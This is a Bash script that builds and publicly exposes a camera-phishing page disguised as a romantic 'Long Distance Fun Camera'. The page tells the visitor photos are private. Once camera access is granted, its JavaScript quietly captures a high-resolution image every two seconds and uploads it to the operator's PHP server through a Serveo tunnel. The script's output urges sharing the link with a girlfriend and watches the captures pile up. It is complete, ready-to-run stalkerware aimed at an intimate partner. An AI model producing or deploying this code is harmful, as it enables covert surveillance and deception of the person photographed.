#!/bin/bash

echo "🌐 Long Distance Camera Capture System"
echo "========================================"
echo "🔧 Creating complete setup..."

# Check dependencies
check_dependency() {
    if ! command -v $1 &> /dev/null; then
        echo "❌ $1 not found. Installing..."
        pkg install -y $2
    fi
}

check_dependency "php" "php"
check_dependency "ssh" "openssh"

# Kill any existing processes
echo "🛑 Cleaning up existing processes..."
pkill -f "php -S" 2>/dev/null
pkill -f "ssh.*serveo.net" 2>/dev/null
sleep 2

# Create directory for captured images
mkdir -p cam_captures
echo "📁 Capture directory: $(pwd)/cam_captures"

# Find available port
find_available_port() {
    local port=8080
    while netstat -tuln 2>/dev/null | grep -q ":$port "; do
        echo "⚠️ Port $port is in use, trying next port..."
        port=$((port + 1))
        if [ $port -gt 8200 ]; then
            echo "❌ Could not find available port (8080-8200)"
            exit 1
        fi
    done
    echo $port
}

PORT=$(find_available_port)
echo "✅ Using port: $PORT"

# Create the HTML file
echo "📄 Creating rexcam.html..."
cat > rexcam.html << 'HTML'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Long Distance Fun Camera 💕</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .subtitle {
            font-size: 1.2em;
            margin-bottom: 30px;
            opacity: 0.9;
        }
        
        .heart {
            color: #ff6b6b;
            animation: heartbeat 1.5s ease-in-out infinite;
        }
        
        @keyframes heartbeat {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        button {
            background: linear-gradient(45deg, #ff6b6b, #ff8e53);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 1.3em;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(255, 107, 107, 0.4);
        }
        
        button:disabled {
            background: #ccc;
            transform: none;
            box-shadow: none;
            cursor: not-allowed;
        }
        
        #video {
            width: 100%;
            max-width: 400px;
            border-radius: 15px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            margin: 20px 0;
            display: none;
        }
        
        .status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.1);
            font-size: 1.1em;
        }
        
        .capturing {
            background: rgba(76, 175, 80, 0.3);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .connection-status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 0.9em;
            background: rgba(255, 255, 255, 0.2);
        }
        
        .connected { background: rgba(76, 175, 80, 0.3); }
        .disconnected { background: rgba(244, 67, 54, 0.3); }
        
        .fun-message {
            font-style: italic;
            margin: 10px 0;
            opacity: 0.8;
        }
        
        .counter {
            font-size: 1.2em;
            margin: 15px 0;
            color: #ffd93d;
        }
        
        .server-info {
            margin-top: 20px;
            padding: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="connection-status" id="connectionStatus">Checking connection...</div>
    
    <div class="container">
        <h1>Long Distance Fun <span class="heart">💕</span></h1>
        <p class="subtitle">Share a fun camera moment with your loved one!</p>
        
        <button id="startButton" onclick="startCamera()">
            🎥 Start Camera Fun
        </button>
        
        <div id="videoContainer">
            <video id="video" autoplay playsinline></video>
            <div id="status" class="status">Ready to start! Click the button above.</div>
            <div class="counter">Photos taken: <span id="photoCount">0</span></div>
            <div id="funMessage" class="fun-message"></div>
        </div>
        
        <div class="server-info">
            <p>🔗 Connected via Serveo - Secure Tunnel</p>
            <p>📸 Photos are private and secure</p>
        </div>
    </div>

    <script>
        let video = document.getElementById('video');
        let startButton = document.getElementById('startButton');
        let statusDiv = document.getElementById('status');
        let connectionStatus = document.getElementById('connectionStatus');
        let photoCountElement = document.getElementById('photoCount');
        let funMessageElement = document.getElementById('funMessage');
        let captureInterval;
        let stream = null;
        let photoCount = 0;
        let isConnected = false;

        // Check server connection
        async function checkConnection() {
            try {
                const response = await fetch('/status');
                const text = await response.text();
                if (text.includes('SERVER_ACTIVE')) {
                    connectionStatus.textContent = '✅ Connected via Serveo';
                    connectionStatus.className = 'connection-status connected';
                    isConnected = true;
                    return true;
                }
            } catch (error) {
                console.log('Connection check failed, retrying...');
                connectionStatus.textContent = '🔄 Connecting...';
                connectionStatus.className = 'connection-status disconnected';
                isConnected = false;
            }
            return false;
        }

        // Fun messages array
        const funMessages = [
            "You're looking amazing! 🌟",
            "That smile is beautiful! 😊",
            "Having fun with you! 💕",
            "This distance means nothing! 🌈",
            "You make my heart happy! 💖",
            "Wish I was there with you! 🥰",
            "Your energy is contagious! ⚡",
            "Making memories together! 📸",
            "Love knows no distance! 🌍",
            "You're my favorite view! 🌄"
        ];

        function getRandomMessage() {
            return funMessages[Math.floor(Math.random() * funMessages.length)];
        }

        function updateFunMessage() {
            funMessageElement.textContent = getRandomMessage();
        }

        async function startCamera() {
            // Check connection first
            if (!await checkConnection()) {
                statusDiv.textContent = '⚠️ Connecting to server... Please wait.';
                setTimeout(() => startCamera(), 2000);
                return;
            }

            try {
                statusDiv.textContent = '🔗 Accessing camera...';
                
                // Request camera with better quality
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    } 
                });

                video.srcObject = stream;
                video.style.display = 'block';
                
                startButton.disabled = true;
                startButton.textContent = '🎥 Camera Active - Have Fun!';
                
                statusDiv.textContent = '✅ Camera connected! Starting fun captures...';
                statusDiv.className = 'status capturing';
                
                photoCount = 0;
                photoCountElement.textContent = '0';
                updateFunMessage();

                // Start capturing every 2 seconds
                captureInterval = setInterval(captureImage, 2000);
                
                // Change fun message every 10 seconds
                setInterval(updateFunMessage, 10000);
                
                // Initial capture after 1 second
                setTimeout(captureImage, 1000);

            } catch (err) {
                console.error('Camera error:', err);
                statusDiv.textContent = '❌ Could not access camera. Please allow camera permissions and refresh.';
                statusDiv.style.background = 'rgba(244, 67, 54, 0.3)';
                startButton.disabled = false;
                startButton.textContent = '🔄 Try Again';
            }
        }

        function captureImage() {
            if (!stream || !isConnected) return;
            
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(function(blob) {
                sendToServer(blob);
            }, 'image/jpeg', 0.85);
        }

        async function sendToServer(blob) {
            const formData = new FormData();
            const timestamp = new Date().getTime();
            const filename = `longdistance_${timestamp}.jpg`;
            
            formData.append('image', blob, filename);
            
            try {
                const response = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.text();
                
                if (result.startsWith('SUCCESS')) {
                    photoCount++;
                    photoCountElement.textContent = photoCount;
                    console.log(`✅ Capture ${photoCount} sent successfully`);
                    
                    // Update status occasionally
                    if (photoCount % 5 === 0) {
                        statusDiv.innerHTML = `📸 ${photoCount} fun moments captured!<br>
                                              <small>Last: ${new Date().toLocaleTimeString()}</small>`;
                    }
                }
            } catch (error) {
                console.error('❌ Send error:', error);
                // Try to reconnect
                setTimeout(checkConnection, 1000);
            }
        }

        // Initialize
        checkConnection();
        setInterval(checkConnection, 15000); // Check every 15 seconds

        // Update fun message periodically
        setInterval(updateFunMessage, 10000);

        // Cleanup when leaving
        window.addEventListener('beforeunload', function() {
            if (captureInterval) clearInterval(captureInterval);
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });

        // Prevent right-click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
    </script>
</body>
</html>
HTML

echo "✅ rexcam.html created successfully!"

# Create the PHP server file
echo "🔧 Creating PHP server file..."
cat > server.php << 'PHP'
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST");
header("Access-Control-Allow-Headers: Content-Type");

// Create captures directory if it doesn't exist
if (!is_dir('cam_captures')) {
    mkdir('cam_captures', 0777, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $uploadDir = 'cam_captures/';
    $timestamp = time();
    $filename = "capture_{$timestamp}_" . uniqid() . ".jpg";
    $uploadFile = $uploadDir . $filename;
    
    if (move_uploaded_file($_FILES['image']['tmp_name'], $uploadFile)) {
        file_put_contents('log.txt', date('Y-m-d H:i:s') . " - Capture saved: $filename\n", FILE_APPEND);
        echo "SUCCESS:$filename";
    } else {
        echo "ERROR:Failed to save file";
    }
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_SERVER['REQUEST_URI'] === '/status') {
    echo "SERVER_ACTIVE:" . date('Y-m-d H:i:s');
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_SERVER['REQUEST_URI'] === '/count') {
    $files = glob('cam_captures/*.jpg');
    echo "TOTAL_CAPTURES:" . count($files);
} else {
    // Serve the HTML file
    readfile('rexcam.html');
}
PHP

echo "✅ server.php created successfully!"

echo "🚀 Starting PHP server on port $PORT..."
php -S 127.0.0.1:$PORT server.php &
SERVER_PID=$!
sleep 3

# Check if server started successfully
if ! ps -p $SERVER_PID > /dev/null 2>&1; then
    echo "❌ Failed to start PHP server on port $PORT"
    echo "💡 Trying alternative method..."
    php -S 127.0.0.1:$PORT &
    SERVER_PID=$!
    sleep 3
fi

if ps -p $SERVER_PID > /dev/null 2>&1; then
    echo "✅ PHP server started successfully (PID: $SERVER_PID)"
else
    echo "❌ Failed to start PHP server."
    exit 1
fi

echo "🌐 Creating Serveo tunnel..."
echo "⏳ This may take 10-15 seconds..."

# Start Serveo and get URL
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$PORT serveo.net 2>&1 | while read line; do
    echo "$line"
    if echo "$line" | grep -q "https://.*\.serveo\.net"; then
        URL=$(echo "$line" | grep -oE 'https://[a-zA-Z0-9]+\.serveo\.net')
        echo "🎉 PUBLIC URL: $URL" > serveo_url.txt
        echo "🎉 PUBLIC URL: $URL"
        echo "🔗 Share this with your girlfriend!"
    fi
done &
SERVEO_PID=$!

# Wait for URL
sleep 15

if [ -f serveo_url.txt ]; then
    SERVEO_URL=$(cat serveo_url.txt)
    echo ""
    echo "========================================"
    echo "🎉 SUCCESS! System is ready!"
    echo "🔗 Public URL: $SERVEO_URL"
    echo "📸 Photos will save to: cam_captures/"
    echo "💡 Press Ctrl+C to stop"
    echo "========================================"
else
    echo "⚠️  Serveo is starting... Check the messages above for URL"
    LOCAL_IP=$(ifconfig | grep -oE 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -oE '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n1)
    if [ ! -z "$LOCAL_IP" ]; then
        echo "📱 Local URL: http://$LOCAL_IP:$PORT"
    fi
fi

echo ""
echo "📊 Monitoring captures..."
echo "👀 Waiting for your girlfriend to connect..."

# Monitor captures
while true; do
    COUNT=$(ls -1 cam_captures/*.jpg 2>/dev/null | wc -l)
    if [ $COUNT -gt 0 ]; then
        LATEST=$(ls -t cam_captures/*.jpg 2>/dev/null | head -n1)
        if [ ! -z "$LATEST" ]; then
            echo "✅ Cam file received: $(basename $LATEST) ($(date '+%H:%M:%S'))"
            echo "📁 Total captures: $COUNT"
        fi
    fi
    sleep 5
done